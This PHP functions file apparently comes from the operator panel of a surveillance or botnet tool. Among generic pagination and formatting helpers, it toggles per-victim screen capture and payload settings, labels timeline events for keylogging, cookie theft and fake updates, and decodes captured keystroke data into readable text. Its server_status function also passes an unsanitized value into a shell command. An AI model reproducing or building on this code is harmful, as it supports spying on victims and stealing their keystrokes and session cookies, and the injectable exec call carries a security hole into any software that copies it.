<?php
error_reporting(E_ERROR | E_WARNING);

require ("Cookie.class.php");
require ("Db.class.php");
require ("Login.class.php");
require ("Browser.class.php");
require ("Template.class.php");

$config = parse_ini_file("config.ini.php");

$db = new Db();

function redirect($url, $seconds = 0) {
    if ($seconds == 0) {
        header("Location: " . $url . ".php");
    } 
    else {
        header("refresh:" . $seconds . "; url=" . $url . ".php");
    }
}

function time_elapsed_string($datetime, $full = false) {
    
    if (is_null($datetime)) return "Never";
    
    $now = new DateTime;
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);
    
    $diff->w = floor($diff->d / 7);
    $diff->d-= $diff->w * 7;
    
    $string = array(
        'y' => 'year',
        'm' => 'month',
        'w' => 'week',
        'd' => 'day',
        'h' => 'hour',
        'i' => 'minute',
        's' => 'second',
    );
    foreach ($string as $k => & $v) {
        if ($diff->$k) {
            $v = $diff->$k . ' ' . $v . ($diff->$k > 1 ? 's' : '');
        } 
        else {
            unset($string[$k]);
        }
    }
    
    if (!$full) $string = array_slice($string, 0, 1);
    return $string ? implode(', ', $string) . ' ago' : 'just now';
}

function sanitize($input) {
    return htmlentities(stripslashes($input) , ENT_QUOTES, "UTF-8");
}

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP')) $ipaddress = getenv('HTTP_CLIENT_IP');
    else if (getenv('HTTP_X_FORWARDED_FOR')) $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if (getenv('HTTP_X_FORWARDED')) $ipaddress = getenv('HTTP_X_FORWARDED');
    else if (getenv('HTTP_FORWARDED_FOR')) $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if (getenv('HTTP_FORWARDED')) $ipaddress = getenv('HTTP_FORWARDED');
    else if (getenv('REMOTE_ADDR')) $ipaddress = getenv('REMOTE_ADDR');
    else $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function server_status($string, $name) {
    
    exec("ps -A | grep -i {$name} | grep -v grep", $output);
    
    if (count($output) > 1) {
        echo "$string: <font color='green'><b>RUNNING</b></font><br>";
    } 
    else {
        echo "$string: <font color='red'><b>DOWN</b></font><br>";
    }
}

function html_option($clientId, $option, $value, $scrInt = '') {
    
    if ($value == "on") {
        $spanClass = '<span class="label label-success">';
        $oposite = "off";
    } 
    elseif ($value == "off") {
        $spanClass = '<span class="label label-danger">';
        $oposite = "on";
    } else {
        $spanClass = '<span class="label label-info">';
        $oposite = "setpayload";
    }
    
    if ($scrInt > 0 && $value == "on") {
        $screencapInt = " (" . $scrInt . "s)";
    } 
    else {
        $screencapInt = "";
    }
    
    $html = ' <td><a href="option.php?setting=' . $option . '&id=' . $clientId . '&value=' . $oposite . '">' . $spanClass . ucfirst($value) . $screencapInt . '</span></a></td>';
    return $html;
}

function read_file($file) {
    $myfile = fopen($file, "r");
    $data = fread($myfile, filesize($file));
    fclose($myfile);
    
    return $data;
}

function timeline_icon($type) {
    switch ($type) {
        case "keylog":
            return "fa fa-keyboard-o bg-green";
        case "screencap":
            return "fa fa-camera-retro bg-navy";
        case "cookie":
            return "fa fa-asterisk bg-aqua";
        case "fake_update":
            return "fa fa-bomb bg-red";
    }
}

function paginate($item_per_page, $current_page, $total_records, $total_pages, $page_url) {
    $pagination = '';
    if ($total_pages > 0 && $total_pages != 1 && $current_page <= $total_pages) {
        
        //verify total pages and current page number
        $pagination.= '<ul class="pagination pagination-sm no-margin pull-right">' . PHP_EOL;
        
        $right_links = $current_page + 3;
        $previous = $current_page - 1;
        
        //previous link
        $next = $current_page + 1;
        
        //next link
        $first_link = true;
        
        //boolean var to decide our first link
        //$page_url.= "&";
        $check = strpos($page_url, ".php?");

        // Note our use of ===.  Simply == would not work as expected
        // because the position of 'a' was the 0th (first) character.
        if ($check)
            $page_url.= "&";
        else
            $page_url.= "?";

        
        if ($current_page > 1) {
            $previous_link = ($previous == 0) ? 1 : $previous;
            $pagination.= '<li class="first"><a href="' . $page_url . 'page=1" title="First">&laquo;</a></li>' . PHP_EOL;
            
            //first link
            $pagination.= '<li><a href="' . $page_url . 'page=' . $previous_link . '" title="Previous">&lt;</a></li>' . PHP_EOL;
            
            //previous link
            for ($i = ($current_page - 2); $i < $current_page; $i++) {
                
                //Create left-hand side links
                if ($i > 0) {
                    $pagination.= '<li><a href="' . $page_url . 'page=' . $i . '">' . $i . '</a></li>' . PHP_EOL;
                }
            }
            $first_link = false;
            
            //set first link to false
            
            
        }
        
        if ($first_link) {
            
            //if current active page is first link
            $pagination.= '<li class="first active"><a href="#">' . $current_page . '</a></li>' . PHP_EOL;
        } 
        elseif ($current_page == $total_pages) {
            
            //if it's the last active link
            $pagination.= '<li class="last active"><a href="#">' . $current_page . '</a></li>' . PHP_EOL;
        } 
        else {
            
            //regular current link
            $pagination.= '<li class="active"><a href="#">' . $current_page . '</a></li>' . PHP_EOL;
        }
        
        for ($i = $current_page + 1; $i < $right_links; $i++) {
            
            //create right-hand side links
            if ($i <= $total_pages) {
                $pagination.= '<li><a href="' . $page_url . 'page=' . $i . '">' . $i . '</a></li>' . PHP_EOL;
            }
        }
        if ($current_page < $total_pages) {
            $next_link = ($i > $total_pages) ? $total_pages : $i;
            $pagination.= '<li><a href="' . $page_url . 'page=' . $next_link . '" >&gt;</a></li>' . PHP_EOL;
            
            //next link
            $pagination.= '<li class="last"><a href="' . $page_url . 'page=' . $total_pages . '" title="Last">&raquo;</a></li>' . PHP_EOL;
            
            //last link
            
            
        }
        
        $pagination.= '</ul>';
    }
    return $pagination;
    
    //return pagination links
    
    
}

function Hex2String($hex) {
    $string = '';
    for ($i = 0; $i < strlen($hex) - 1; $i+= 2) {
        $string.= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $string;
}

function keylog_output($data) {

    $data = explode(",", $data);
    
    foreach ($data as & $value) {
        if (strlen($value) == 1) $value = str_replace("8", "DEL", $value);
        if (strlen($value) == 1) $value = str_replace("9", "", $value);
        if (strlen($value) == 1) $value = str_replace("c", "", $value);
    }
    
    $data = implode(",", $data);

    preg_match_all("/DEL/", $data, $matches);
    $count = count($matches[0]);
    
    if ($count > 0) {
        
        for ($i = 0; $i < $count; $i++) {
            
            $data = preg_replace('/,([a-z0-9]){2},DEL,/i', ',', $data);
        }
        
        $string = Hex2String(str_replace(",", "", $data));
    } 
    else {
        $string = Hex2String(str_replace(",", "", $data));
    }
    
    return $string;
}
?>